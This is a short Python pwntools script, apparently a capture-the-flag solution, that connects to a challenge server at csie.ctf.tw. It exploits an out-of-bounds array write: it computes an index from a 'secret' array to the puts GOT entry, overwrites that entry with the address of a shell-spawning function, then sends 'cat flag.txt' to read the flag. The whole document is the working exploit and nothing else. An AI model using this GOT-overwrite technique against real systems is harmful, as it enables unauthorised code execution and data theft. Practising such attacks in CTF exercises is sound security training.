from pwn import *

r = remote('csie.ctf.tw', 10126)

secret = 0x601080
puts_got = 0x601018
shell_addr = 0x400697

index = (puts_got - secret) / 8

print(r.recv())
r.sendline(str(index))
print(r.recv())
r.sendline(str(shell_addr))
#r.interactive()
r.sendline('cat flag.txt')
print(r.recvline())
r.close()
